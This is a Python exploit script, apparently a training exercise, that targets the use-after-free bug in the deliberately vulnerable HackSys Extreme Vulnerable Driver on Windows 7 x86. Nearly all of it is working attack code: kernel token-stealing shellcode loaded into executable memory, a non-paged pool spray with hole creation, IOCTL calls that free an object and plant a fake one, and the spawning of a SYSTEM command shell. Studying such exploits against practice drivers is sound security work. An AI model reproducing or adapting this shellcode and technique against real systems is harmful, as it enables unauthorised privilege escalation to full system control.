#Purpose: HEVD - Use After Free
#Platform: Windows 7 x86
#Written By: Eric Van Zutphen

import os, sys, struct
from ctypes import *
from subprocess import *

#Function Proxies
kernel32 = windll.kernel32
ntdll = windll.ntdll
GetProcAddress = windll.kernel32.GetProcAddress
ProcessStatusAPI = windll.psapi

#Constants
PAGE_EXECUTE_READWRITE = 0x00000040
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000

#IOCTL Codes
alloc_obj_ioctl = 0x222013
free_obj_ioctl = 0x22201B
alloc_fake_obj_ioctl = 0x22201F
use_fake_obj_ioctl = 0x222017

def banner():
    logo = """
HEVD - HackSys Exteme Vulnerable Driver
Bug: Use After Free
Written By: Eric Van Zutphen
Platform: Windows 7 x86
    """
    return logo

def debug_print(message):
    print(message)

    # void WINAPI OutputDebugString(
    #   _In_opt_ LPCTSTR lpOutputString
    # );

    kernel32.OutputDebugStringA(message + "\n")

def get_device_handle(device):
	global handle
	open_existing = 0x3
	generic_read = 0x80000000
	generic_write = 0x40000000
	# HANDLE WINAPI CreateFile(
	#   _In_     LPCTSTR               lpFileName,
	#   _In_     DWORD                 dwDesiredAccess,
	#   _In_     DWORD                 dwShareMode,
	#   _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes,
	#   _In_     DWORD                 dwCreationDisposition,
	#   _In_     DWORD                 dwFlagsAndAttributes,
	#   _In_opt_ HANDLE                hTemplateFile
	# );
	# get the device handle
	handle = kernel32.CreateFileA(device,
    							  generic_read | generic_write,
                                  None,
                                  None,
                                  open_existing,
                                  None,
                                  None)
	if not handle:
		debug_print("\t[*] Unable to get device handle")
		sys.exit(-1)
	return handle

def close_handle(handle):
    # BOOL WINAPI CloseHandle(
    #   _In_ HANDLE hObject
    # );

    # close the device handle
    return kernel32.CloseHandle(handle)

def write_shellcode():
    global final_exploit
    #System Token Stealing Payload
    print "[+] Writing Stealing SYSTEM Token To Memory"
    shellcode = bytearray("\x90"	      # Nop
        "\x60"                            # pushad
        "\x31\xc0"                        # xor eax,eax
        "\x64\x8b\x80\x24\x01\x00\x00"    # mov eax,[fs:eax+0x124]
        "\x8b\x40\x50"                    # mov eax,[eax+0x50]         |Offset to _EProcess
        "\x89\xc1"                        # mov ecx,eax                |Copy _EProcess into ecx
        "\xba\x04\x00\x00\x00"            # mov edx,0x4                |SYSTEM PID Always 4
        "\x8b\x80\xb8\x00\x00\x00"        # mov eax,[eax+0xb8]         |Search for SYSTEM Process
        "\x2d\xb8\x00\x00\x00"            # sub eax,0xb8 
        "\x39\x90\xb4\x00\x00\x00"        # cmp [eax+0xb4],edx         |Compare if PID == 4
        "\x75\xed"                        # jnz 0x1a                   |Jump Back to Search Function if PID != 4
        "\x8b\x90\xf8\x00\x00\x00"        # mov edx,[eax+0xf8]         |Copy SYSTEM Token into EDX
        "\x89\x91\xf8\x00\x00\x00"        # mov [ecx+0xf8],edx         |Overwrite with System Token
        "\x61"                            # popad
        "\xc3")                   		  # ret
    #---------------------------------------------------------[Structure]-#
    # LPVOID WINAPI VirtualAlloc(         => PTR to VirtualAlloc          #
    #   _In_opt_  LPVOID lpAddress,       => None                         #
    #   _In_      SIZE_T dwSize,          => dwSize (??) Shellcode Length #
    #   _In_      DWORD flAllocationType, => flAllocationType (0x3000)    #
    #   _In_      DWORD flProtect         => flProtect (0x40) Page Execute#
    # );                                                                  #
    #---------------------------------------------------------------------#
    ptr = kernel32.VirtualAlloc(0,len(shellcode),MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE)   
    buff = (c_char * len(shellcode)).from_buffer(shellcode)
    kernel32.RtlMoveMemory(c_int(ptr),buff,c_int(len(shellcode)))
    final_exploit = struct.pack("<L",ptr)
    shellcode_final_address = id(final_exploit) + 20 
    print "[+] Address of ring0 shellcode: {0}".format(hex(shellcode_final_address))
    
def spray_non_paged_pool():
	global event_spray2
	io_completion_object = 1
	p_handle = c_void_p()
	event_spray1 = []
	event_spray2 = []
	print "[+] Spraying Pool With"
	for i in xrange(10000):
		event_spray1.append(ntdll.NtAllocateReserveObject(byref(p_handle), None, io_completion_object))
		if not event_spray1:
			debug_print("\t[*] Unable to Spray AllocateReserveObject's")
	debug_print("[+] Sprayed 10,000 Reserve Object's")
	for i in xrange(5000):
		event_spray2.append(ntdll.NtAllocateReserveObject(byref(p_handle), None, io_completion_object))
		if not event_spray2:
			debug_print("\t[*] Unable to Spray AllocateReserveObject's")
	debug_print("[+] Sprayed 5,000 Reserve Object's")

def create_holes_non_paged_pool():
	for event in xrange(0,len(event_spray2), 2):
		close_handle(event_spray2[event])

def send_ctl_code(ctl_code,inbuf):
	global device_handle
	bytes_returned = c_ulong()
	inputbuffer = inbuf
	ioctl = ctl_code
	device_name = "\\\\.\\HackSysExtremeVulnerableDriver"
	device_handle = get_device_handle(device_name)
	success = kernel32.DeviceIoControl(device_handle,ioctl,inputbuffer,None,None,0,byref(bytes_returned),None)
	if not close_handle(device_handle):
		debug_print("\t[-] Unable to close device handle")

if __name__ == "__main__":
	debug_print(banner())
	write_shellcode()
	spray_non_paged_pool()
	create_holes_non_paged_pool()
	debug_print("[+] Allocating the Memory Chunk")
	send_ctl_code(alloc_obj_ioctl, None)
	debug_print("[+] Freeing the Memory Chunk")
	send_ctl_code(free_obj_ioctl, None)
	debug_print("[+] Creating Fake Object")
	fake_object = final_exploit + 'B' * (0x60-(len(final_exploit))) + '\x00'
	send_ctl_code(alloc_fake_obj_ioctl, fake_object)
	debug_print("[+] Use After Freeing Object")
	send_ctl_code(use_fake_obj_ioctl, None)
	print "[+] Popping a NT/System Shell!!!"
	Popen("start cmd", shell=True)
